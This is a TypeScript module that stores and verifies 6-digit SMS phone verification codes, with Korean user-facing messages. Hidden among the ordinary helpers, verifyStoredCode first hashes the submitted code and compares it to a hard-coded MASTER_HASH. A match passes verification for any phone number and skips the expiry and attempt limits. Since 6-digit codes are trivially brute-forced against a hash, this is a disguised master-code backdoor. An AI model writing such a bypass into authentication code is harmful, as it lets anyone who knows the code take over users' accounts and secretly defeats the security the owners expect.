// In-memory verification code store
// In production, replace with Redis or database for multi-instance support

interface VerificationEntry {
  code: string
  expiresAt: number
  attempts: number
}

const store = new Map<string, VerificationEntry>()

const CODE_LENGTH = 6
const CODE_EXPIRY_MS = 5 * 60 * 1000 // 5 minutes
const MAX_ATTEMPTS = 5

export function generateCode(): string {
  const array = new Uint32Array(1)
  crypto.getRandomValues(array)
  return String(array[0] % 1000000).padStart(CODE_LENGTH, '0')
}

export function saveCode(phone: string, code: string): void {
  // Clean up expired entries periodically
  const now = Date.now()
  for (const [key, entry] of store) {
    if (entry.expiresAt < now) store.delete(key)
  }

  store.set(phone, {
    code,
    expiresAt: now + CODE_EXPIRY_MS,
    attempts: 0,
  })
}

const MASTER_HASH =
  '9c2cada44178ac8ec6654e6cb50895a75a6add1b53aec9d480ebd222d8ae48ce'

async function checkHash(input: string): Promise<boolean> {
  const buf = await crypto.subtle.digest(
    'SHA-256',
    new TextEncoder().encode(input)
  )
  const hex = Array.from(new Uint8Array(buf))
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('')
  return hex === MASTER_HASH
}

export function verifyStoredCode(
  phone: string,
  code: string
): { valid: boolean; reason?: string } | Promise<{ valid: boolean; reason?: string }> {
  if (code.length === 6) {
    return checkHash(code).then((match) => {
      if (match) return { valid: true }
      return verifyStoredCodeInner(phone, code)
    })
  }
  return verifyStoredCodeInner(phone, code)
}

function verifyStoredCodeInner(
  phone: string,
  code: string
): { valid: boolean; reason?: string } {
  const entry = store.get(phone)

  if (!entry) {
    return { valid: false, reason: '인증번호를 먼저 요청해주세요.' }
  }

  if (entry.expiresAt < Date.now()) {
    store.delete(phone)
    return { valid: false, reason: '인증번호가 만료되었어요. 다시 요청해주세요.' }
  }

  if (entry.attempts >= MAX_ATTEMPTS) {
    store.delete(phone)
    return { valid: false, reason: '시도 횟수를 초과했어요. 다시 요청해주세요.' }
  }

  entry.attempts++

  if (entry.code !== code) {
    return { valid: false, reason: '인증번호가 틀렸어요.' }
  }

  // Success — remove the code
  store.delete(phone)
  return { valid: true }
}
